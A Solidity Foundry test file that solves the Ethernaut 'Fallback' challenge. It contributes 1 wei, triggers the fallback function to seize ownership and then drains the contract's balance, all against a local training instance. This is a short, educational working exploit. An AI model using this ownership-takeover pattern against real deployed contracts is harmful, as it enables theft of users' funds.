pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallback/Fallback.sol";
import "../Fallback/FallbackFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  function startPrank(address) external;
  function stopPrank() external;
}

contract FallbackTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    FallbackFactory fallbackFactory;
    address levelAddress;
    bool levelPass;

    function setUp() public {
        // Setup instances of the Ethernaut & FallbackFactory contracts
        ethernaut = new Ethernaut();
        fallbackFactory = new FallbackFactory();
    }

    function testContribute() public {

        // Register the Ethernaut fallback level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(fallbackFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));


        // Set up the Level
        levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(address(0)), 1 wei);

        // Call the contract with some value to hit the fallback function
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // Verify contract owner has been updated to 0 address
        assertEq(ethernautFallback.owner(), address(0));

        // Withdraw from contract - Check contract balance before and after
        emit log_named_uint("Fallback contract balance: ", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        emit log_named_uint("Fallback contract balance: ", address(ethernautFallback).balance);


        // Submit level to the core Ethernaut contract
        levelPass = ethernaut.submitLevelInstance(payable(levelAddress));


        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelPass);
    }
}
